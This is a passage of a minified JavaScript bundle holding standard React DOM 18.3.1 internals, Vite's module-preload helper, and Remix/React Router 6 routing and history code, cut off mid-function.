s=e.pingCache;s!==null&&s.delete(t),t=qe(),e.pingedLanes|=e.suspendedLanes&n,we===e&&(xe&n)===n&&(fe===4||fe===3&&(xe&130023424)===xe&&500>ie()-Ad?Hn(e,0):Cd|=n),Ve(e,t)}function hw(e,t){t===0&&(e.mode&1?(t=zi,zi<<=1,!(zi&130023424)&&(zi=4194304)):t=1);var n=qe();e=Kt(e,t),e!==null&&(ki(e,t,n),Ve(e,n))}function Rk(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),hw(e,n)}function Pk(e,t){var n=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(n=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(P(314))}s!==null&&s.delete(t),hw(e,n)}var pw;pw=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||Fe.current)De=!0;else{if(!(e.lanes&n)&&!(t.flags&128))return De=!1,gk(e,t,n);De=!!(e.flags&131072)}else De=!1,Z&&t.flags&1048576&&yy(t,Xo,t.index);switch(t.lanes=0,t.tag){case 2:var s=t.type;Eo(e,t),e=t.pendingProps;var r=zs(t,Ae.current);Ds(t,n),r=vd(null,t,s,e,r,n);var i=bd();return t.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,Be(s)?(i=!0,Ko(t)):i=!1,t.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,fd(t),r.updater=La,t.stateNode=r,r._reactInternals=t,Bc(t,s,e,n),t=Uc(null,t,s,!0,i,n)):(t.tag=0,Z&&i&&ad(t),Ee(null,t,r,n),t=t.child),t;case 16:s=t.elementType;e:{switch(Eo(e,t),e=t.pendingProps,r=s._init,s=r(s._payload),t.type=s,r=t.tag=Ok(s),e=ft(s,e),r){case 0:t=Wc(null,t,s,e,n);break e;case 1:t=Ep(null,t,s,e,n);break e;case 11:t=Cp(null,t,s,e,n);break e;case 14:t=Ap(null,t,s,ft(s.type,e),n);break e}throw Error(P(306,s,""))}return t;case 0:return s=t.type,r=t.pendingProps,r=t.elementType===s?r:ft(s,r),Wc(e,t,s,r,n);case 1:return s=t.type,r=t.pendingProps,r=t.elementType===s?r:ft(s,r),Ep(e,t,s,r,n);case 3:e:{if(Yy(t),e===null)throw Error(P(387));s=t.pendingProps,i=t.memoizedState,r=i.element,Sy(e,t),ea(t,s,null,n);var o=t.memoizedState;if(s=o.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},t.updateQueue.baseState=i,t.memoizedState=i,t.flags&256){r=Gs(Error(P(423)),t),t=Rp(e,t,s,n,r);break e}else if(s!==r){r=Gs(Error(P(424)),t),t=Rp(e,t,s,n,r);break e}else for(Qe=gn(t.stateNode.containerInfo.firstChild),Ke=t,Z=!0,gt=null,n=xy(t,null,s,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if($s(),s===r){t=Yt(e,t,n);break e}Ee(e,t,s,n)}t=t.child}return t;case 5:return Ty(t),e===null&&Dc(t),s=t.type,r=t.pendingProps,i=e!==null?e.memoizedProps:null,o=r.children,Ic(s,r)?o=null:i!==null&&Ic(s,i)&&(t.flags|=32),Ky(e,t),Ee(e,t,o,n),t.child;case 6:return e===null&&Dc(t),null;case 13:return Xy(e,t,n);case 4:return md(t,t.stateNode.containerInfo),s=t.pendingProps,e===null?t.child=Hs(t,null,s,n):Ee(e,t,s,n),t.child;case 11:return s=t.type,r=t.pendingProps,r=t.elementType===s?r:ft(s,r),Cp(e,t,s,r,n);case 7:return Ee(e,t,t.pendingProps,n),t.child;case 8:return Ee(e,t,t.pendingProps.children,n),t.child;case 12:return Ee(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(s=t.type._context,r=t.pendingProps,i=t.memoizedProps,o=r.value,K(Jo,s._currentValue),s._currentValue=o,i!==null)if(kt(i.value,o)){if(i.children===r.children&&!Fe.current){t=Yt(e,t,n);break e}}else for(i=t.child,i!==null&&(i.return=t);i!==null;){var a=i.dependencies;if(a!==null){o=i.child;for(var l=a.firstContext;l!==null;){if(l.context===s){if(i.tag===1){l=Ht(-1,n&-n),l.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?l.next=l:(l.next=u.next,u.next=l),c.pending=l}}i.lanes|=n,l=i.alternate,l!==null&&(l.lanes|=n),_c(i.return,n,t),a.lanes|=n;break}l=l.next}}else if(i.tag===10)o=i.type===t.type?null:i.child;else if(i.tag===18){if(o=i.return,o===null)throw Error(P(341));o.lanes|=n,a=o.alternate,a!==null&&(a.lanes|=n),_c(o,n,t),o=i.sibling}else o=i.child;if(o!==null)o.return=i;else for(o=i;o!==null;){if(o===t){o=null;break}if(i=o.sibling,i!==null){i.return=o.return,o=i;break}o=o.return}i=o}Ee(e,t,r.children,n),t=t.child}return t;case 9:return r=t.type,s=t.pendingProps.children,Ds(t,n),r=lt(r),s=s(r),t.flags|=1,Ee(e,t,s,n),t.child;case 14:return s=t.type,r=ft(s,t.pendingProps),r=ft(s.type,r),Ap(e,t,s,r,n);case 15:return Qy(e,t,t.type,t.pendingProps,n);case 17:return s=t.type,r=t.pendingProps,r=t.elementType===s?r:ft(s,r),Eo(e,t),t.tag=1,Be(s)?(e=!0,Ko(t)):e=!1,Ds(t,n),zy(t,s,r),Bc(t,s,r,n),Uc(null,t,s,!0,e,n);case 19:return Jy(e,t,n);case 22:return Gy(e,t,n)}throw Error(P(156,t.tag))};function fw(e,t){return Vg(e,t)}function qk(e,t,n,s){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function it(e,t,n,s){return new qk(e,t,n,s)}function qd(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Ok(e){if(typeof e=="function")return qd(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Ku)return 11;if(e===Yu)return 14}return 2}function bn(e,t){var n=e.alternate;return n===null?(n=it(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function qo(e,t,n,s,r,i){var o=2;if(s=e,typeof e=="function")qd(e)&&(o=1);else if(typeof e=="string")o=5;else e:switch(e){case gs:return Qn(n.children,r,i,t);case Gu:o=8,r|=8;break;case uc:return e=it(12,n,t,r|2),e.elementType=uc,e.lanes=i,e;case dc:return e=it(13,n,t,r),e.elementType=dc,e.lanes=i,e;case hc:return e=it(19,n,t,r),e.elementType=hc,e.lanes=i,e;case Tg:return Fa(n,r,i,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case kg:o=10;break e;case Sg:o=9;break e;case Ku:o=11;break e;case Yu:o=14;break e;case rn:o=16,s=null;break e}throw Error(P(130,e==null?e:typeof e,""))}return t=it(o,n,t,r),t.elementType=e,t.type=s,t.lanes=i,t}function Qn(e,t,n,s){return e=it(7,e,s,t),e.lanes=n,e}function Fa(e,t,n,s){return e=it(22,e,s,t),e.elementType=Tg,e.lanes=n,e.stateNode={isHidden:!1},e}function El(e,t,n){return e=it(6,e,null,t),e.lanes=n,e}function Rl(e,t,n){return t=it(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Ik(e,t,n,s,r){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=ll(0),this.expirationTimes=ll(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ll(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function Od(e,t,n,s,r,i,o,a,l){return e=new Ik(e,t,n,a,l),t===1?(t=1,i===!0&&(t|=8)):t=0,i=it(3,null,null,t),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},fd(i),e}function Nk(e,t,n){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:ms,key:s==null?null:""+s,children:e,containerInfo:t,implementation:n}}function mw(e){if(!e)return Tn;e=e._reactInternals;e:{if(os(e)!==e||e.tag!==1)throw Error(P(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(Be(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(P(171))}if(e.tag===1){var n=e.type;if(Be(n))return my(e,n,t)}return t}function gw(e,t,n,s,r,i,o,a,l){return e=Od(n,s,!0,e,r,i,o,a,l),e.context=mw(null),n=e.current,s=qe(),r=vn(n),i=Ht(s,r),i.callback=t??null,yn(n,i,r),e.current.lanes=r,ki(e,r,s),Ve(e,s),e}function Ba(e,t,n,s){var r=t.current,i=qe(),o=vn(r);return n=mw(n),t.context===null?t.context=n:t.pendingContext=n,t=Ht(i,o),t.payload={element:e},s=s===void 0?null:s,s!==null&&(t.callback=s),e=yn(r,t,o),e!==null&&(xt(e,r,o,i),To(e,r,o)),o}function la(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function _p(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Id(e,t){_p(e,t),(e=e.alternate)&&_p(e,t)}function jk(){return null}var yw=typeof reportError=="function"?reportError:function(e){console.error(e)};function Nd(e){this._internalRoot=e}Va.prototype.render=Nd.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(P(409));Ba(e,t,null,null)};Va.prototype.unmount=Nd.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;ss(function(){Ba(null,e,null,null)}),t[Gt]=null}};function Va(e){this._internalRoot=e}Va.prototype.unstable_scheduleHydration=function(e){if(e){var t=Gg();e={blockedOn:null,target:e,priority:t};for(var n=0;n<an.length&&t!==0&&t<an[n].priority;n++);an.splice(n,0,e),n===0&&Yg(e)}};function jd(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Wa(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Fp(){}function Mk(e,t,n,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=la(o);i.call(c)}}var o=gw(t,s,e,0,null,!1,!1,"",Fp);return e._reactRootContainer=o,e[Gt]=o.current,Zr(e.nodeType===8?e.parentNode:e),ss(),o}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var a=s;s=function(){var c=la(l);a.call(c)}}var l=Od(e,0,!1,null,null,!1,!1,"",Fp);return e._reactRootContainer=l,e[Gt]=l.current,Zr(e.nodeType===8?e.parentNode:e),ss(function(){Ba(t,l,n,s)}),l}function Ua(e,t,n,s,r){var i=n._reactRootContainer;if(i){var o=i;if(typeof r=="function"){var a=r;r=function(){var l=la(o);a.call(l)}}Ba(t,o,e,r)}else o=Mk(n,t,e,r,s);return la(o)}Hg=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=xr(t.pendingLanes);n!==0&&(Zu(t,n|1),Ve(t,ie()),!(W&6)&&(Ks=ie()+500,Rn()))}break;case 13:ss(function(){var s=Kt(e,1);if(s!==null){var r=qe();xt(s,e,1,r)}}),Id(e,1)}};ed=function(e){if(e.tag===13){var t=Kt(e,134217728);if(t!==null){var n=qe();xt(t,e,134217728,n)}Id(e,134217728)}};Qg=function(e){if(e.tag===13){var t=vn(e),n=Kt(e,t);if(n!==null){var s=qe();xt(n,e,t,s)}Id(e,t)}};Gg=function(){return z};Kg=function(e,t){var n=z;try{return z=e,t()}finally{z=n}};kc=function(e,t,n){switch(t){case"input":if(mc(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var s=n[t];if(s!==e&&s.form===e.form){var r=Na(s);if(!r)throw Error(P(90));Ag(s),mc(s,r)}}}break;case"textarea":Rg(e,n);break;case"select":t=n.value,t!=null&&Ns(e,!!n.multiple,t,!1)}};Mg=Ed;Lg=ss;var Lk={usingClientEntryPoint:!1,Events:[Ti,bs,Na,Ng,jg,Ed]},gr={findFiberByHostInstance:Bn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Dk={bundleType:gr.bundleType,version:gr.version,rendererPackageName:gr.rendererPackageName,rendererConfig:gr.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Jt.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Fg(e),e===null?null:e.stateNode},findFiberByHostInstance:gr.findFiberByHostInstance||jk,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var to=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!to.isDisabled&&to.supportsFiber)try{Pa=to.inject(Dk),Nt=to}catch{}}Ze.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Lk;Ze.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!jd(t))throw Error(P(200));return Nk(e,t,null,n)};Ze.createRoot=function(e,t){if(!jd(e))throw Error(P(299));var n=!1,s="",r=yw;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(s=t.identifierPrefix),t.onRecoverableError!==void 0&&(r=t.onRecoverableError)),t=Od(e,1,!1,null,null,n,!1,s,r),e[Gt]=t.current,Zr(e.nodeType===8?e.parentNode:e),new Nd(t)};Ze.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(P(188)):(e=Object.keys(e).join(","),Error(P(268,e)));return e=Fg(t),e=e===null?null:e.stateNode,e};Ze.flushSync=function(e){return ss(e)};Ze.hydrate=function(e,t,n){if(!Wa(t))throw Error(P(200));return Ua(null,e,t,!0,n)};Ze.hydrateRoot=function(e,t,n){if(!jd(e))throw Error(P(405));var s=n!=null&&n.hydratedSources||null,r=!1,i="",o=yw;if(n!=null&&(n.unstable_strictMode===!0&&(r=!0),n.identifierPrefix!==void 0&&(i=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),t=gw(t,null,e,1,n??null,r,!1,i,o),e[Gt]=t.current,Zr(e),s)for(e=0;e<s.length;e++)n=s[e],r=n._getVersion,r=r(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,r]:t.mutableSourceEagerHydrationData.push(n,r);return new Va(t)};Ze.render=function(e,t,n){if(!Wa(t))throw Error(P(200));return Ua(null,e,t,!1,n)};Ze.unmountComponentAtNode=function(e){if(!Wa(e))throw Error(P(40));return e._reactRootContainer?(ss(function(){Ua(null,null,e,!1,function(){e._reactRootContainer=null,e[Gt]=null})}),!0):!1};Ze.unstable_batchedUpdates=Ed;Ze.unstable_renderSubtreeIntoContainer=function(e,t,n,s){if(!Wa(n))throw Error(P(200));if(e==null||e._reactInternals===void 0)throw Error(P(38));return Ua(e,t,n,!1,s)};Ze.version="18.3.1-next-f1338f8080-20240426";function ww(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(ww)}catch(e){console.error(e)}}ww(),wg.exports=Ze;var _k=wg.exports,Bp=_k;lc.createRoot=Bp.createRoot,lc.hydrateRoot=Bp.hydrateRoot;const Fk="modulepreload",Bk=function(e){return"/"+e},Vp={},Pn=function(t,n,s){let r=Promise.resolve();if(n&&n.length>0){document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),a=(o==null?void 0:o.nonce)||(o==null?void 0:o.getAttribute("nonce"));r=Promise.allSettled(n.map(l=>{if(l=Bk(l),l in Vp)return;Vp[l]=!0;const c=l.endsWith(".css"),u=c?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${l}"]${u}`))return;const d=document.createElement("link");if(d.rel=c?"stylesheet":Fk,c||(d.as="script"),d.crossOrigin="",d.href=l,a&&d.setAttribute("nonce",a),document.head.appendChild(d),c)return new Promise((h,m)=>{d.addEventListener("load",h),d.addEventListener("error",()=>m(new Error(`Unable to preload CSS for ${l}`)))})}))}function i(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return r.then(o=>{for(const a of o||[])a.status==="rejected"&&i(a.reason);return t().catch(i)})};/**
 * @remix-run/router v1.23.4
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function li(){return li=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var s in n)({}).hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},li.apply(null,arguments)}var dn;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(dn||(dn={}));const Wp="popstate";function Vk(e){e===void 0&&(e={});function t(r,i){let{pathname:o="/",search:a="",hash:l=""}=as(r.location.hash.substr(1));return!o.startsWith("/")&&!o.startsWith(".")&&(o="/"+o),tu("",{pathname:o,search:a,hash:l},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function n(r,i){let o=r.document.querySelector("base"),a="";if(o&&o.getAttribute("href")){let l=r.location.href,c=l.indexOf("#");a=c===-1?l:l.slice(0,c)}return a+"#"+(typeof i=="string"?i:ca(i))}function s(r,i){Md(r.pathname.charAt(0)==="/","relative pathnames are not supported in hash history.push("+JSON.stringify(i)+")")}return Uk(t,n,s,e)}function oe(e,t){if(e===!1||e===null||typeof e>"u")throw new Error(t)}function Md(e,t){if(!e){typeof console<"u"&&console.warn(t);try{throw new Error(t)}catch{}}}function Wk(){return Math.random().toString(36).substr(2,8)}function Up(e,t){return{usr:e.state,key:e.key,idx:t}}function tu(e,t,n,s){return n===void 0&&(n=null),li({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof t=="string"?as(t):t,{state:n,key:t&&t.key||s||Wk()})}function ca(e){let{pathname:t="/",search:n="",hash:s=""}=e;return n&&n!=="?"&&(t+=n.charAt(0)==="?"?n:"?"+n),s&&s!=="#"&&(t+=s.charAt(0)==="#"?s:"#"+s),t}function as(e){let t={};if(e){let n=e.indexOf("#");n>=0&&(t.hash=e.substr(n),e=e.substr(0,n));let s=e.indexOf("?");s>=0&&(t.search=e.substr(s),e=e.substr(0,s)),e&&(t.pathname=e)}return t}function Uk(e,t,n,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,o=r.history,a=dn.Pop,l=null,c=u();c==null&&(c=0,o.replaceState(li({},o.state,{idx:c}),""));function u(){return(o.state||{idx:null}).idx}function d(){a=dn.Pop;let x=u(),y=x==null?null:x-c;c=x,l&&l({action:a,location:v.location,delta:y})}function h(x,y){a=dn.Push;let g=tu(v.location,x,y);n&&n(g,x),c=u()+1;let b=Up(g,c),k=v.createHref(g);try{o.pushState(b,"",k)}catch(C){if(C instanceof DOMException&&C.name==="DataCloneError")throw C;r.location.assign(k)}i&&l&&l({action:a,location:v.location,delta:1})}function m(x,y){a=dn.Replace;let g=tu(v.location,x,y);n&&n(g,x),c=u();let b=Up(g,c),k=v.createHref(g);o.replaceState(b,"",k),i&&l&&l({action:a,location:v.location,delta:0})}function f(x){let y=r.location.origin!=="null"?r.location.origin:r.location.href,g=typeof x=="string"?x:ca(x);return g=g.replace(/ $/,"%20"),oe(y,"No window.location.(origin|href) available to create URL for href: "+g),new URL(g,y)}let v={get action(){return a},get location(){return e(r,o)},listen(x){if(l)throw new Error("A history only accepts one active listener");return r.addEventListener(Wp,d),l=x,()=>{r.removeEventListener(Wp,d),l=null}},createHref(x){return t(r,x)},createURL:f,encodeLocation(x){let y=f(x);return{pathname:y.pathname,search:y.search,hash:y.hash}},push:h,replace:m,go(x){return o.go(x)}};return v}var zp;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(zp||(zp={}));function zk(e,t,n){return n===void 0&&(n="/"),$k(e,t,n)}function $k(e,t,n,s){let r=typeof t=="string"?as(t):t,i=Ld(r.pathname||"/",n);if(i==null)return null;let o=vw(e);Hk(o);let a=null,l=r1(i);for(let c=0;a==null&&c<o.length;++c)a=t1(o[c],l);return a}function vw(e,t,n,s){t===void 0&&(t=[]),n===void 0&&(n=[]),s===void 0&&(s="");let r=(i,o,a)=>{let l={relativePath:a===void 0?i.path||"":a,caseSensitive:i.caseSensitive===!0,childrenIndex:o,route:i};l.relativePath.startsWith("/")&&(oe(l.relativePath.startsWith(s),'Absolute route path "'+l.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),l.relativePath=l.relativePath.slice(s.length));let c=xn([s,l.relativePath]),u=n.concat(l);i.children&&i.children.length>0&&(oe(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),vw(i.children,t,u,c)),!(i.path==null&&!i.index)&&t.push({path:c,score:Zk(c,i.index),routesMeta:u})};return e.forEach((i,o)=>{var a;if(i.path===""||!((a=i.path)!=null&&a.includes("?")))r(i,o);else for(let l of bw(i.path))r(i,o,l)}),t}function bw(e){let t=e.split("/");if(t.length===0)return[];let[n,...s]=t,r=n.endsWith("?"),i=n.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let o=bw(s.join("/")),a=[];return a.push(...o.map(l=>l===""?i:[i,l].join("/"))),r&&a.push(...o),a.map(l=>e.startsWith("/")&&l===""?"/":l)}function Hk(e){e.sort((t,n)=>t.score!==n.score?n.score-t.score:e1(t.routesMeta.map(s=>s.childrenIndex),n.routesMeta.map(s=>s.childrenIndex)))}const Qk=/^:[\w-]+$/,Gk=3,Kk=2,Yk=1,Xk=10,Jk=-2,$p=e=>e==="*";function Zk(e,t){let n=e.split("/"),s=n.length;return n.some($p)&&(s+=Jk),t&&(s+=Kk),n.filter(r=>!$p(r)).reduce((r,i)=>r+(Qk.test(i)?Gk:i===""?Yk:Xk),s)}function e1(e,t){return e.length===t.length&&e.slice(0,-1).every((s,r)=>s===t[r])?e[e.length-1]-t[t.length-1]:0}function t1(e,t,n){let{routesMeta:s}=e,r={},i="/",o=[];for(let a=0;a<s.length;++a){let l=s[a],c=a===s.length-1,u=i==="/"?t:t.slice(i.length)||"/",d=n1({path:l.relativePath,caseSensitive:l.caseSensitive,end:c},u),h=l.route;if(!d)return null;Object.assign(r,d.params),o.push({params:r,pathname:xn([i,d.pathname]),pathnameBase:a1(xn([i,d.pathnameBase])),route:h}),d.pathnameBase!=="/"&&(i=xn([i,d.pathnameBase]))}return o}function n1(e,t){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[n,s]=s1(e.path,e.caseSensitive,e.end),r=t.match(n);if(!r)return null;let i=r[0],o=i.replace(/(.)\/+$/,"$1"),a=r.slice(1);return{params:s.reduce((c,u,d)=>{let{paramName:h,isOptional:m}=u;if(h==="*"){let v=a[d]||"";o=i.slice(0,i.length-v.length).replace(/(.)\/+$/,"$1")}const f=a[d];return m&&!f?c[h]=void 0:c[h]=(f||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:o,pattern:e}}function s1(e,t,n){t===void 0&&(t=!1),n===void 0&&(n=!0),Md(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,a,l)=>(s.push({paramName:a,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,t?void 0:"i"),s]}function r1(e){try{return e.split("/").map(t=>decodeURIComponent(t).replace(/\//g,"%2F")).join("/")}catch(t){return Md(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+t+").")),e}}function Ld(e,t){if(t==="/")return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith("/")?t.length-1:t.length,s=e.charAt(n);return s&&s!=="/"?null:e.slice(n)||"/"}function i1(e,t){t===void 0&&(t="/");let{pathname:n,search:s="",hash:r=""}=typeof e=="string"?as(e):e,i;return n?(n=xw(n),n.startsWith("/")?i=Hp(n.substring(1),"/"):i=Hp(n,t)):i=t,{pathname:i,search:l1(s),hash:c1(r)}}function Hp(e,t){let n=t.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?n.length>1&&n.pop():r!=="."&&n.push(r)}),n.length>1?n.join("/"):"/"}function Pl(e,t,n,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+t+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function o1(e){return e.filter((t,n)=>n===0||t.route.path&&t.route.path.length>0)}function Dd(e,t){let n=o1(e);return t?n.map((s,r)=>r===n.length-1?s.pathname:s.pathnameBase):n.map(s=>s.pathnameBase)}function _d(e,t,n,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=as(e):(r=li({},e),oe(!r.pathname||!r.pathname.includes("?"),Pl("?","pathname","search",r)),oe(!r.pathname||!r.pathname.includes("#"),Pl("#","pathname","hash",r)),oe(!r.search||!r.search.includes("#"),Pl("#","search","hash",r)));let i=e===""||r.pathname==="",o=i?"/":r.pathname,a;if(o==null)a=n;else{let d=t.length-1;if(!s&&o.startsWith("..")){let h=o.split("/");for(;h[0]==="..";)h.shift(),d-=1;r.pathname=h.join("/")}a=d>=0?t[d]:"/"}let l=i1(r,a),c=o&&o!=="/"&&o.endsWith("/"),u=(i||o===".")&&n.endsWith("/");return!l.pathname.endsWith("/")&&(c||u)&&(l.pathname+="/"),l}const xw=e=>e.replace(/\/\/+/g,"/"),xn=e=>xw(e.join("/")),a1=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),l1=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,c1=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function u1(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const kw=["post","put","patch","delete"];new Set(kw);const d1=["get",...kw];new Set(d1);/**
 * React Router v6.30.6
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ci(){return ci=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var s in n)({}).hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},ci.apply(null,arguments)}const Fd=w.createContext(null),h1=w.createContext(null),qn=w.createContext(null),za=w.createContext(null),Zt=w.createContext({outlet:null,matches:[],isDataRoute:!1}),Sw=w.createContext(null);function p1(e,t){let{relative:n}=t===void 0?{}:t;sr()||oe(!1);let{basename:s,navigator:r}=w.useContext(qn),{hash:i,pathname:o,search:a}=Cw(e,{relative:n}),l=o;return s!=="/"&&(l=o==="/"?s:xn([s,o])),r.createHref({pathname:l,search:a,hash:i})}function sr(){return w.useContext(za)!=null}function en(){return sr()||oe(!1),w.useContext(za).location}function Tw(e){w.useContext(qn).static||w.useLayoutEffect(e)}function $a(){let{isDataRoute:e}=w.useContext(Zt);return e?A1():f1()}function f1(){sr()||oe(!1);let e=w.useContext(Fd),{basename:t,future:n,navigator:s}=w.useContext(qn),{matches:r}=w.useContext(Zt),{pathname:i}=en(),o=JSON.stringify(Dd(r,n.v7_relativeSplatPath)),a=w.useRef(!1);return Tw(()=>{a.current=!0}),w.useCallback(function(c,u){if(u===void 0&&(u={}),!a.current)return;if(typeof 